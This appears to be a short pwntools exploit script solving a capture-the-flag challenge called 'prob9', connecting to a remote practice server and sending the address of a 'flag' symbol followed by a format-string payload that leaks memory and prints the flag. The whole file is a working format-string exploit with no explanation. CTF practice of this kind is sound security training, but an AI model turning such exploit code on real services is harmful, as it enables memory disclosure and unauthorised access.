from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob9")
p = remote("fsi.zzado.kr", 9939)
e = ELF("./prob9")
lib = ELF('./libc.so.6')

flag = e.symbols['flag']

p.recv()
payload = p64(flag)
p.send(payload)

log.info(f'flag : {hex(flag)}')

p.recv()
payload = b'%p '*13 +b'%s'
p.send(payload)
p.interactive()
